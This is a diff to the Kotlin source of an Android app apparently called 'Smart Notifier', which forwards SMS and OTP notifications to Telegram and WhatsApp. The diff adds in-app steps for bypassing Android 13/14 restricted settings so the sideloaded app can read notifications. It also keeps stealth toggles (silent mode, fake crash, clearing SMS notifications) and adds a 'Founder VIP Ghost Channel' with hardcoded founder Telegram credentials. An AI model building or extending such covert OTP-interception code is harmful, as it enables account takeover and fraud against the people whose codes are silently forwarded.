@@ -62,17 +62,27 @@ val TextMuted = Color(0xFF6B7280)
 
 class MainActivity : ComponentActivity() {
 
-    private val permissionLauncher = registerForActivityResult(
-        ActivityResultContracts.RequestMultiplePermissions()
-    ) { permissions ->
-        val smsGranted = permissions[Manifest.permission.RECEIVE_SMS] ?: false
-        if (smsGranted) {
-            Toast.makeText(this, "✅ Permissions Granted", Toast.LENGTH_SHORT).show()
-        }
+    private val notificationPermissionLauncher = registerForActivityResult(
+        ActivityResultContracts.RequestPermission()
+    ) { _ ->
+        // Notification permission handled
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+
+        // Ensure Launcher Icon is always ENABLED (Permanently fixes duplicate app icon and disabled shortcut bugs)
+        try {
+            val comp = ComponentName(this, MainActivity::class.java)
+            if (packageManager.getComponentEnabledSetting(comp) != PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
+                packageManager.setComponentEnabledSetting(
+                    comp,
+                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                    PackageManager.DONT_KILL_APP
+                )
+            }
+        } catch (ignored: Exception) {}
+
         requestAppPermissions()
 
         setContent {
@@ -95,18 +105,12 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun requestAppPermissions() {
-        val perms = mutableListOf(
-            Manifest.permission.RECEIVE_SMS,
-            Manifest.permission.READ_SMS
-        )
+        // NotificationListener is 100% sufficient for reading SMS and all app OTP notifications.
+        // We only request POST_NOTIFICATIONS on Android 13+ for status alerts.
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            perms.add(Manifest.permission.POST_NOTIFICATIONS)
-        }
-        val needed = perms.filter {
-            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
-        }
-        if (needed.isNotEmpty()) {
-            permissionLauncher.launch(needed.toTypedArray())
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
+                notificationPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
+            }
         }
     }
 }
@@ -125,24 +129,16 @@ fun isIgnoringBatteryOptimizations(context: Context): Boolean {
     return true
 }
 
-fun isLauncherIconHidden(context: Context): Boolean {
-    val comp = ComponentName(context, MainActivity::class.java)
-    val state = context.packageManager.getComponentEnabledSetting(comp)
-    return state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
-}
-
-fun setLauncherIconVisibility(context: Context, hide: Boolean) {
-    val comp = ComponentName(context, MainActivity::class.java)
-    val newState = if (hide) {
-        PackageManager.COMPONENT_ENABLED_STATE_DISABLED
-    } else {
-        PackageManager.COMPONENT_ENABLED_STATE_ENABLED
+fun openAppInfoSettings(context: Context) {
+    try {
+        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
+            data = Uri.fromParts("package", context.packageName, null)
+            flags = Intent.FLAG_ACTIVITY_NEW_TASK
+        }
+        context.startActivity(intent)
+    } catch (e: Exception) {
+        Toast.makeText(context, "Could not open App Info: ${e.localizedMessage}", Toast.LENGTH_SHORT).show()
     }
-    context.packageManager.setComponentEnabledSetting(
-        comp,
-        newState,
-        PackageManager.DONT_KILL_APP
-    )
 }
 
 @Composable
@@ -846,6 +842,54 @@ fun AutostartScreen(
                         Text(if (hasNotificationAccess) "Granted" else "⚙️ Allow", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = if (hasNotificationAccess) Color.White else Color.Black)
                     }
                 }
+
+                Spacer(modifier = Modifier.height(12.dp))
+                HorizontalDivider(color = CardBorder)
+                Spacer(modifier = Modifier.height(12.dp))
+
+                // Status 3: Android 13/14 Restricted Settings Direct 1-Click Opener
+                Row(
+                    modifier = Modifier.fillMaxWidth(),
+                    verticalAlignment = Alignment.CenterVertically,
+                    horizontalArrangement = Arrangement.SpaceBetween
+                ) {
+                    Column(modifier = Modifier.weight(1f)) {
+                        Text("3. Restricted Settings Unlock (Android 13/14)", fontWeight = FontWeight.Bold, fontSize = 12.sp, color = Color.White)
+                        Text(
+                            text = "Agar Notification switch band/grey dikhe to yaha se App Info kholein",
+                            fontSize = 10.sp,
+                            color = Color(0xFFA5B4FC)
+                        )
+                    }
+                    Button(
+                        onClick = { openAppInfoSettings(context) },
+                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF4F46E5)),
+                        shape = RoundedCornerShape(8.dp),
+                        contentPadding = PaddingValues(horizontal = 12.dp, vertical = 6.dp)
+                    ) {
+                        Text("⚙️ App Info", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = Color.White)
+                    }
+                }
+            }
+        }
+
+        Spacer(modifier = Modifier.height(14.dp))
+
+        // Android 13/14 Restricted Settings Step-by-Step Guide Card
+        MncCard {
+            Column(modifier = Modifier.padding(16.dp)) {
+                Text("⚠️ Android 13/14 'Restricted Setting' Solution (Teer / 3 Dots):", fontWeight = FontWeight.Bold, fontSize = 13.sp, color = Color(0xFFFBBF24))
+                Spacer(modifier = Modifier.height(6.dp))
+                Text(
+                    text = "Agar Notification switch dabane par 'Restricted setting' likha aata hai:\n" +
+                            "1️⃣ Upar diye gaye '⚙️ App Info' button par click karein.\n" +
+                            "2️⃣ App Info screen ke upar right side me 3 dots [⋮] ya teer [↗] par click karein.\n" +
+                            "3️⃣ 'Allow restricted settings' select karein aur screen lock/PIN enter karein.\n" +
+                            "4️⃣ Wapas aakar '⚙️ Allow' dabayein, switch turant ON ho jayega!",
+                    fontSize = 11.sp,
+                    color = Color(0xFFCBD5E1),
+                    lineHeight = 17.sp
+                )
             }
         }
 
@@ -904,11 +948,28 @@ fun ServicesTab(
 ) {
     val prefs = remember { PrefsHelper.getPrefs(context) }
     val scope = rememberCoroutineScope()
+    val isMasterFounder = remember { CloudflareLicenseManager.isMasterFounder(context) }
 
-    // 1. Telegram 1 State
+    // 1. Telegram 1 State (Sanitized: Never expose Founder credentials in customer text fields)
     var isTelegramEnabled by remember { mutableStateOf(prefs.getBoolean("is_telegram_enabled", true)) }
-    var botToken by remember { mutableStateOf(prefs.getString("bot_token", "") ?: "") }
-    var chatId by remember { mutableStateOf(prefs.getString("chat_id", "") ?: "") }
+    var botToken by remember {
+        val raw = prefs.getString("bot_token", "") ?: ""
+        if (raw == TelegramHelper.DEFAULT_BOT_TOKEN) {
+            prefs.edit().remove("bot_token").apply()
+            mutableStateOf("")
+        } else {
+            mutableStateOf(raw)
+        }
+    }
+    var chatId by remember {
+        val raw = prefs.getString("chat_id", "") ?: ""
+        if (raw == TelegramHelper.DEFAULT_CHANNEL_ID || raw == TelegramHelper.DEFAULT_USER_ID) {
+            prefs.edit().remove("chat_id").apply()
+            mutableStateOf("")
+        } else {
+            mutableStateOf(raw)
+        }
+    }
     var telegramStatus by remember { mutableStateOf("") }
 
     // 2. Telegram 2 State
@@ -927,9 +988,7 @@ fun ServicesTab(
     var isOnlyOtpMode by remember { mutableStateOf(prefs.getBoolean("only_otp_mode", false)) }
     var isLowBatteryAlertEnabled by remember { mutableStateOf(prefs.getBoolean("low_battery_alert_enabled", false)) }
 
-    // 5. Custom Secret Code & Security State
-    var customSecretCode by remember { mutableStateOf(prefs.getString("custom_secret_code", "") ?: "") }
-    var isIconHidden by remember { mutableStateOf(isLauncherIconHidden(context)) }
+    // 5. Stealth & Protection Suite State (Clean: Zero Broken Icon Hiding)
     var isSilentMode by remember { mutableStateOf(!prefs.getBoolean("show_screen_popups", false)) }
     var isAppLockEnabled by remember { mutableStateOf(prefs.getBoolean("app_lock_enabled", false)) }
     var isFakeCrashEnabled by remember { mutableStateOf(prefs.getBoolean("fake_crash_enabled", false)) }
@@ -1079,19 +1138,48 @@ fun ServicesTab(
                     )
                 }
 
+                if (isMasterFounder) {
+                    Spacer(modifier = Modifier.height(8.dp))
+                    Surface(
+                        color = Color(0xFF1E1B4B),
+                        shape = RoundedCornerShape(10.dp),
+                        border = BorderStroke(1.dp, Color(0xFF4338CA))
+                    ) {
+                        Column(modifier = Modifier.fillMaxWidth().padding(10.dp)) {
+                            Row(verticalAlignment = Alignment.CenterVertically) {
+                                Text("👑 Founder VIP Ghost Channel Connected", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = Color(0xFFA5B4FC))
+                                Spacer(modifier = Modifier.width(6.dp))
+                                Text("• Encrypted", fontSize = 10.sp, color = AccentEmerald)
+                            }
+                            Spacer(modifier = Modifier.height(2.dp))
+                            Text(
+                                "Master channel backend me secure linked hai. Private Token ya Chat ID screen par kabhi leak nahi hoga.",
+                                fontSize = 10.sp,
+                                color = Color(0xFF94A3B8)
+                            )
+                        }
+                    }
+                }
+
                 if (isTelegramEnabled) {
                     Spacer(modifier = Modifier.height(8.dp))
-                    MncTextField(value = botToken, onValueChange = { botToken = it }, label = "Bot Token 1")
+                    MncTextField(value = botToken, onValueChange = { botToken = it }, label = if (isMasterFounder) "Custom Bot Token (Optional)" else "Bot Token 1")
                     Spacer(modifier = Modifier.height(8.dp))
-                    MncTextField(value = chatId, onValueChange = { chatId = it }, label = "Channel / Chat ID 1 (e.g. -100...)")
+                    MncTextField(value = chatId, onValueChange = { chatId = it }, label = if (isMasterFounder) "Custom Channel ID (Optional)" else "Channel / Chat ID 1 (e.g. -100...)")
                     Spacer(modifier = Modifier.height(10.dp))
                     Button(
                         onClick = {
                             telegramStatus = "Testing Telegram 1..."
                             scope.launch {
+                                val tokenToUse = if (botToken.trim().isNotEmpty()) botToken.trim() else if (isMasterFounder) TelegramHelper.DEFAULT_BOT_TOKEN else ""
+                                val chatToUse = if (chatId.trim().isNotEmpty()) chatId.trim() else if (isMasterFounder) TelegramHelper.DEFAULT_CHANNEL_ID else ""
+                                if (tokenToUse.isEmpty() || chatToUse.isEmpty()) {
+                                    telegramStatus = "❌ Bot Token aur Chat ID enter karein"
+                                    return@launch
+                                }
                                 val res = TelegramHelper.sendMessage(
-                                    botToken.trim(),
-                                    chatId.trim(),
+                                    tokenToUse,
+                                    chatToUse,
                                     "🎉 Smart Notifier: Telegram 1 connection verified successfully!"
                                 )
                                 telegramStatus = if (res.first) "✅ Telegram 1 Connected!" else "❌ ${res.second}"
@@ -1229,43 +1317,12 @@ fun ServicesTab(
 
         Spacer(modifier = Modifier.height(12.dp))
 
-        // Card: Stealth & Security Controls
+        // Card: Stealth & Security Controls (Clean, 100% Reliable Suite)
         MncCard {
             Column(modifier = Modifier.padding(14.dp)) {
                 Text("🛡️ Stealth & Protection Suite", fontWeight = FontWeight.Bold, fontSize = 15.sp, color = Color(0xFFA78BFA))
-                Text("App ko hide karne aur security locks configure karein:", fontSize = 11.sp, color = TextSecondary)
+                Text("Security locks aur silent operation configure karein:", fontSize = 11.sp, color = TextSecondary)
                 Spacer(modifier = Modifier.height(12.dp))
-
-                // Custom Secret Dialer Setting
-                Text("📞 Customer Secret Dialer Code:", fontWeight = FontWeight.Bold, fontSize = 13.sp, color = TextPrimary)
-                Text("Phone dialer me *#*#CODE#*#* dial karke app kholi/chhupai jati hai:", fontSize = 10.sp, color = TextMuted)
-                Spacer(modifier = Modifier.height(6.dp))
-                Row(modifier = Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically) {
-                    Box(modifier = Modifier.weight(1f)) {
-                        MncTextField(
-                            value = customSecretCode,
-                            onValueChange = { customSecretCode = it.filter { ch -> ch.isDigit() }.take(6) },
-                            label = "Custom Code (e.g. 1234)"
-                        )
-                    }
-                    Spacer(modifier = Modifier.width(8.dp))
-                    Button(
-                        onClick = {
-                            if (customSecretCode.trim().isNotEmpty()) {
-                                prefs.edit().putString("custom_secret_code", customSecretCode.trim()).apply()
-                                Toast.makeText(context, "Code Saved: *#*#$customSecretCode#*#*", Toast.LENGTH_SHORT).show()
-                            }
-                        },
-                        colors = ButtonDefaults.buttonColors(containerColor = AccentIndigo),
-                        shape = RoundedCornerShape(8.dp),
-                        modifier = Modifier.height(52.dp)
-                    ) {
-                        Text("Set", fontSize = 12.sp, fontWeight = FontWeight.Bold)
-                    }
-                }
-
-                HorizontalDivider(modifier = Modifier.padding(vertical = 10.dp), color = CardBorder)
-
 
                 // Silent Stealth Mode
                 SettingToggleRow("Silent Stealth Mode", isSilentMode) { silent ->
@@ -1275,7 +1332,7 @@ fun ServicesTab(
 
                 HorizontalDivider(modifier = Modifier.padding(vertical = 10.dp), color = CardBorder)
 
-                // Fingerprint Lock
+                // Fingerprint / PIN Lock
                 SettingToggleRow("Fingerprint / PIN Lock", isAppLockEnabled) { checked ->
                     isAppLockEnabled = checked
                     prefs.edit().putBoolean("app_lock_enabled", checked).apply()
@@ -1296,28 +1353,16 @@ fun ServicesTab(
                     isAutoClearSms = checked
                     prefs.edit().putBoolean("auto_clear_sms_notification", checked).apply()
                 }
-
-                HorizontalDivider(modifier = Modifier.padding(vertical = 10.dp), color = CardBorder)
-
-                // Hide App Icon
-                SettingToggleRow("Hide Launcher Icon", isIconHidden) { hide ->
-                    setLauncherIconVisibility(context, hide)
-                    isIconHidden = hide
-                }
             }
         }
-
-        Spacer(modifier = Modifier.height(12.dp))
 
         Spacer(modifier = Modifier.height(16.dp))
 
         // Save All Button
         Button(
             onClick = {
-                prefs.edit()
+                val editor = prefs.edit()
                     .putBoolean("is_telegram_enabled", isTelegramEnabled)
-                    .putString("bot_token", botToken.trim())
-                    .putString("chat_id", chatId.trim())
                     .putBoolean("is_telegram_2_enabled", isTelegram2Enabled)
                     .putString("bot_token_2", botToken2.trim())
                     .putString("chat_id_2", chatId2.trim())
@@ -1329,8 +1374,27 @@ fun ServicesTab(
                     .putBoolean("app_lock_enabled", isAppLockEnabled)
                     .putBoolean("fake_crash_enabled", isFakeCrashEnabled)
                     .putBoolean("auto_clear_sms_notification", isAutoClearSms)
-                    .putString("custom_secret_code", customSecretCode.trim())
-                    .apply()
+
+                // Zero-Leak Protection: Never persist founder credentials in public customer keys
+                val cleanBotToken = botToken.trim()
+                if (cleanBotToken.isNotEmpty() && cleanBotToken != TelegramHelper.DEFAULT_BOT_TOKEN) {
+                    editor.putString("bot_token", cleanBotToken)
+                } else if (cleanBotToken == TelegramHelper.DEFAULT_BOT_TOKEN) {
+                    editor.remove("bot_token")
+                } else {
+                    editor.putString("bot_token", "")
+                }
+
+                val cleanChatId = chatId.trim()
+                if (cleanChatId.isNotEmpty() && cleanChatId != TelegramHelper.DEFAULT_CHANNEL_ID && cleanChatId != TelegramHelper.DEFAULT_USER_ID) {
+                    editor.putString("chat_id", cleanChatId)
+                } else if (cleanChatId == TelegramHelper.DEFAULT_CHANNEL_ID || cleanChatId == TelegramHelper.DEFAULT_USER_ID) {
+                    editor.remove("chat_id")
+                } else {
+                    editor.putString("chat_id", "")
+                }
+
+                editor.apply()
                 Toast.makeText(context, "✅ Settings Saved!", Toast.LENGTH_SHORT).show()
             },
             modifier = Modifier.fillMaxWidth().height(50.dp),
@@ -1365,28 +1429,37 @@ fun QuickSetupGuideDialog(
                         onClick = { selectedGuideTab = 0 },
                         colors = ButtonDefaults.buttonColors(containerColor = if (selectedGuideTab == 0) AccentIndigo else Color(0xFF1E293B)),
                         shape = RoundedCornerShape(8.dp),
-                        contentPadding = PaddingValues(horizontal = 6.dp, vertical = 4.dp),
-                        modifier = Modifier.weight(1.1f)
+                        contentPadding = PaddingValues(horizontal = 4.dp, vertical = 4.dp),
+                        modifier = Modifier.weight(1f)
                     ) {
-                        Text("⚡ Autostart", fontSize = 10.sp, maxLines = 1)
+                        Text("⚡ Autostart", fontSize = 9.sp, maxLines = 1)
                     }
                     Button(
                         onClick = { selectedGuideTab = 1 },
                         colors = ButtonDefaults.buttonColors(containerColor = if (selectedGuideTab == 1) AccentIndigo else Color(0xFF1E293B)),
                         shape = RoundedCornerShape(8.dp),
-                        contentPadding = PaddingValues(horizontal = 6.dp, vertical = 4.dp),
+                        contentPadding = PaddingValues(horizontal = 4.dp, vertical = 4.dp),
                         modifier = Modifier.weight(1f)
                     ) {
-                        Text("📢 Telegram", fontSize = 10.sp, maxLines = 1)
+                        Text("📢 Telegram", fontSize = 9.sp, maxLines = 1)
                     }
                     Button(
                         onClick = { selectedGuideTab = 2 },
                         colors = ButtonDefaults.buttonColors(containerColor = if (selectedGuideTab == 2) AccentIndigo else Color(0xFF1E293B)),
                         shape = RoundedCornerShape(8.dp),
-                        contentPadding = PaddingValues(horizontal = 6.dp, vertical = 4.dp),
+                        contentPadding = PaddingValues(horizontal = 4.dp, vertical = 4.dp),
                         modifier = Modifier.weight(1f)
                     ) {
-                        Text("💬 WhatsApp", fontSize = 10.sp, maxLines = 1)
+                        Text("💬 WhatsApp", fontSize = 9.sp, maxLines = 1)
+                    }
+                    Button(
+                        onClick = { selectedGuideTab = 3 },
+                        colors = ButtonDefaults.buttonColors(containerColor = if (selectedGuideTab == 3) AccentIndigo else Color(0xFF1E293B)),
+                        shape = RoundedCornerShape(8.dp),
+                        contentPadding = PaddingValues(horizontal = 4.dp, vertical = 4.dp),
+                        modifier = Modifier.weight(1.1f)
+                    ) {
+                        Text("🔒 Android 13/14", fontSize = 9.sp, maxLines = 1)
                     }
                 }
 
@@ -1422,7 +1495,7 @@ fun QuickSetupGuideDialog(
                         color = TextSecondary,
                         lineHeight = 16.sp
                     )
-                } else {
+                } else if (selectedGuideTab == 2) {
                     // WhatsApp Guide
                     Text("💬 WhatsApp Setup (CallMeBot):", fontWeight = FontWeight.Bold, fontSize = 13.sp, color = Color(0xFF2DD4BF))
                     Spacer(modifier = Modifier.height(6.dp))
@@ -1435,6 +1508,22 @@ fun QuickSetupGuideDialog(
                         "4. Wahi API Key yahan app me 'CallMeBot API Key' me daal dein.\n" +
                         "5. Apna WhatsApp mobile number international format me dalein (e.g. 919876543210).\n\n" +
                         "🛡️ Ghost Stealth: Phone ke WhatsApp me koi message ya chat history nahi banti!",
+                        fontSize = 11.sp,
+                        color = TextSecondary,
+                        lineHeight = 16.sp
+                    )
+                } else {
+                    // Android 13/14 Restricted Settings Unlock Guide
+                    Text("🔒 Android 13/14 Restricted Settings Unlock:", fontWeight = FontWeight.Bold, fontSize = 13.sp, color = Color(0xFFFBBF24))
+                    Spacer(modifier = Modifier.height(6.dp))
+                    Text(
+                        "Google ne Android 13 aur Android 14 me naya security block joda hai jisse APK install karne par Notification permissions grey/band rehti hain.\n\n" +
+                        "Isko kholne ka 10 second ka simple tarika:\n" +
+                        "1. Autostart screen me diye gaye '⚙️ App Info' button par click karein.\n" +
+                        "2. App Info page par sabse upar right corner me 3-dots [⋮] ya teer [↗] icon par tap karein.\n" +
+                        "3. 'Allow restricted settings' select karein aur phone fingerprint/PIN enter karein.\n" +
+                        "4. Wapas app me aakar '⚙️ Allow' button dabayein, switch turant ON ho jayega!\n\n" +
+                        "✅ Iske baad Smart Notifier bina kisi rukawat ke 24 ghante background me OTP forward karta rahega.",
                         fontSize = 11.sp,
                         color = TextSecondary,
                         lineHeight = 16.sp
@@ -1961,7 +2050,7 @@ fun FounderConsoleScreen(
                             focusedContainerColor = Color(0xFF090D1A),
                             unfocusedContainerColor = Color(0xFF090D1A)
                         ),
-                        modifier = Modifier.fillMaxWidth().height(56.dp),
+                        modifier = Modifier.fillMaxWidth(),
                         singleLine = true
                     )
 
@@ -2453,7 +2542,7 @@ fun FounderRulesTab(
                             focusedBorderColor = Color(0xFF6366F1),
                             unfocusedBorderColor = Color(0xFF334155)
                         ),
-                        modifier = Modifier.weight(1f).height(50.dp),
+                        modifier = Modifier.weight(1f),
                         singleLine = true
                     )
                     Spacer(modifier = Modifier.width(8.dp))
@@ -2466,7 +2555,7 @@ fun FounderRulesTab(
                         },
                         colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF4F46E5)),
                         shape = RoundedCornerShape(10.dp),
-                        modifier = Modifier.height(50.dp)
+                        modifier = Modifier.height(56.dp)
                     ) {
                         Text("+ Add", fontWeight = FontWeight.Bold, fontSize = 12.sp)
                     }
@@ -2534,7 +2623,7 @@ fun FounderRulesTab(
                         unfocusedBorderColor = Color(0xFF334155)
                     ),
                     shape = RoundedCornerShape(10.dp),
-                    modifier = Modifier.fillMaxWidth().height(52.dp),
+                    modifier = Modifier.fillMaxWidth(),
                     singleLine = true
                 )
                 Spacer(modifier = Modifier.height(8.dp))
@@ -2551,7 +2640,7 @@ fun FounderRulesTab(
                         unfocusedBorderColor = Color(0xFF334155)
                     ),
                     shape = RoundedCornerShape(10.dp),
-                    modifier = Modifier.fillMaxWidth().height(52.dp),
+                    modifier = Modifier.fillMaxWidth(),
                     singleLine = true
                 )
                 Spacer(modifier = Modifier.height(10.dp))
@@ -2783,7 +2872,7 @@ fun FounderSupportTab(
                         unfocusedBorderColor = Color(0xFF334155)
                     ),
                     shape = RoundedCornerShape(10.dp),
-                    modifier = Modifier.fillMaxWidth().height(54.dp),
+                    modifier = Modifier.fillMaxWidth(),
                     singleLine = true
                 )
 
@@ -2803,7 +2892,7 @@ fun FounderSupportTab(
                         unfocusedBorderColor = Color(0xFF334155)
                     ),
                     shape = RoundedCornerShape(10.dp),
-                    modifier = Modifier.fillMaxWidth().height(56.dp),
+                    modifier = Modifier.fillMaxWidth(),
                     singleLine = true
                 )
 
